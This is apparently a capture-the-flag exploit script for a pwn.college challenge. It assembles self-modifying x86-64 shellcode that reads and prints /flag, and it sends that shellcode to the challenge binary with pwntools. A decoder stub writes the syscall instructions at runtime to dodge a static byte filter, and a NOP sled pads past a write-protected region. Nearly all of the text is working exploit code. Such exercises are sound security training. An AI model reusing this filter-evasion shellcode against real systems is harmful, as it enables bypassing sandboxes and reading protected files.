# the related url is https://pwn.college/program-security/program-security/

# Self-modifying shellcode to bypass syscall filter
# Strategy: Write syscall bytes (\x0f\x05) at runtime to avoid static detection
# NEW CONSTRAINT: First 4096 bytes are write-protected, so we need padding

# First, build the main shellcode with placeholders to calculate positions
main_code = b""

# Build "/flag"
main_code += b"\x31\xc0"  # xor eax, eax
main_code += b"\x50"  # push rax
main_code += b"\xc6\x04\x24\x2f"  # mov byte [rsp], 0x2f
main_code += b"\xc7\x44\x24\x01\x66\x6c\x61\x67"  # mov dword [rsp+1], "flag"

# open(rsp, 0, 0)
main_code += b"\x54"  # push rsp
main_code += b"\x5f"  # pop rdi
main_code += b"\x31\xf6"  # xor esi, esi
main_code += b"\x31\xd2"  # xor edx, edx
main_code += b"\xb0\x02"  # mov al, 2
syscall_offset_1 = len(main_code)  # Position of first syscall
main_code += b"\x90\x90"  # NOP placeholder (will become syscall)

# read(fd, rsp, 60)
main_code += b"\x50"  # push rax (fd)
main_code += b"\x54"  # push rsp (buffer)
main_code += b"\x5e"  # pop rsi
main_code += b"\x5f"  # pop rdi
main_code += b"\xb2\x3c"  # mov dl, 60
main_code += b"\x31\xc0"  # xor eax, eax
syscall_offset_2 = len(main_code)  # Position of second syscall
main_code += b"\x90\x90"  # NOP placeholder (will become syscall)

# write(1, rsp, rax)
main_code += b"\x6a\x01"  # push 1
main_code += b"\x5f"  # pop rdi
main_code += b"\x89\xc2"  # mov edx, eax
main_code += b"\xb0\x01"  # mov al, 1
syscall_offset_3 = len(main_code)  # Position of third syscall
main_code += b"\x90\x90"  # NOP placeholder (will become syscall)

# exit
main_code += b"\xb0\x3c"  # mov al, 60
main_code += b"\x31\xff"  # xor edi, edi
syscall_offset_4 = len(main_code)  # Position of fourth syscall
main_code += b"\x90\x90"  # NOP placeholder (will become syscall)

# ============================================
# DECODER STUB: Writes syscall instructions at runtime
# ============================================

# NEW STRATEGY: Add padding to push main_code beyond 4096 bytes
# Layout:
# 1. Decoder stub (can be in first 4096 bytes - doesn't need to modify itself)
# 2. Padding (NOPs to reach past 4096 bytes)
# 3. Main code (with syscall placeholders that will be modified)

decoder_prologue = b"\xe8\x00\x00\x00\x00"  # call next instruction (5 bytes)
decoder_prologue += b"\x5b"  # pop rbx (1 byte) - RBX now points here (offset 5)

# Calculate padding needed
# Each write is now 7 bytes: \xc6\x83 [4-byte offset] [1-byte value]
decoder_writes_size = 8 * 7  # 8 writes * 7 bytes each = 56 bytes
total_decoder_size = 6 + decoder_writes_size  # = 62 bytes

# We need main_code to start AFTER byte 4096
# Add padding to ensure this
WRITE_PROTECTED_SIZE = 4096
padding_needed = WRITE_PROTECTED_SIZE - total_decoder_size
padding = b"\x90" * padding_needed  # NOP sled

# Now recalculate offsets
# RBX points to offset 5 (the pop instruction)
# Main code starts at offset: total_decoder_size + padding_needed = 4096
# Offset from RBX to main code start:
base_offset = WRITE_PROTECTED_SIZE - 5  # = 4096 - 5 = 4091

offset_1 = base_offset + syscall_offset_1
offset_2 = base_offset + syscall_offset_2
offset_3 = base_offset + syscall_offset_3
offset_4 = base_offset + syscall_offset_4

print(
    f"[DEBUG] syscall_offset_1 = {syscall_offset_1}, base_offset = {base_offset}, offset_1 = {offset_1} (0x{offset_1:02x})"
)
print(
    f"[DEBUG] syscall_offset_2 = {syscall_offset_2}, offset_2 = {offset_2} (0x{offset_2:02x})"
)
print(
    f"[DEBUG] syscall_offset_3 = {syscall_offset_3}, offset_3 = {offset_3} (0x{offset_3:02x})"
)
print(
    f"[DEBUG] syscall_offset_4 = {syscall_offset_4}, offset_4 = {offset_4} (0x{offset_4:02x})"
)

# Build the decoder writes
# Since offsets are > 255, we need to use 32-bit displacement: mov byte [rbx+disp32], imm8
# Encoding: \xc6\x83 [4-byte offset little-endian] [1-byte value]
decoder_writes = b""

# Helper to encode 32-bit offset as little-endian
def encode_offset(offset):
    return offset.to_bytes(4, 'little')

# Syscall 1
decoder_writes += b"\xc6\x83" + encode_offset(offset_1) + b"\x0f"      # mov byte [rbx+offset], 0x0f
decoder_writes += b"\xc6\x83" + encode_offset(offset_1 + 1) + b"\x05"  # mov byte [rbx+offset+1], 0x05

# Syscall 2
decoder_writes += b"\xc6\x83" + encode_offset(offset_2) + b"\x0f"
decoder_writes += b"\xc6\x83" + encode_offset(offset_2 + 1) + b"\x05"

# Syscall 3
decoder_writes += b"\xc6\x83" + encode_offset(offset_3) + b"\x0f"
decoder_writes += b"\xc6\x83" + encode_offset(offset_3 + 1) + b"\x05"

# Syscall 4
decoder_writes += b"\xc6\x83" + encode_offset(offset_4) + b"\x0f"
decoder_writes += b"\xc6\x83" + encode_offset(offset_4 + 1) + b"\x05"

decoder = decoder_prologue + decoder_writes

# Combine decoder, padding, and main code
shellcode = decoder + padding + main_code

# Verify NO syscall-related bytes (the new filter requirement!)
assert b"\x0f\x05" not in shellcode, "ERROR: syscall bytes found!"
assert b"\x0f\x34" not in shellcode, "ERROR: sysenter bytes found!"
assert b"\xcd\x80" not in shellcode, "ERROR: int 0x80 bytes found!"

print(f"[+] Shellcode size: {len(shellcode)} bytes")
print(f"[+] Decoder size: {len(decoder)} bytes")
print(f"[+] Padding size: {len(padding)} bytes")
print(f"[+] Main code size: {len(main_code)} bytes")
print(f"[+] Main code starts at offset: {total_decoder_size + padding_needed}")
print(
    f"[+] Syscall positions in main_code: {syscall_offset_1}, {syscall_offset_2}, {syscall_offset_3}, {syscall_offset_4}"
)
print(f"[+] All syscall filters bypassed!")

# Run
from pwn import *

io = process("/challenge/syscall-shenanigans")
io.send(shellcode)
io.interactive()
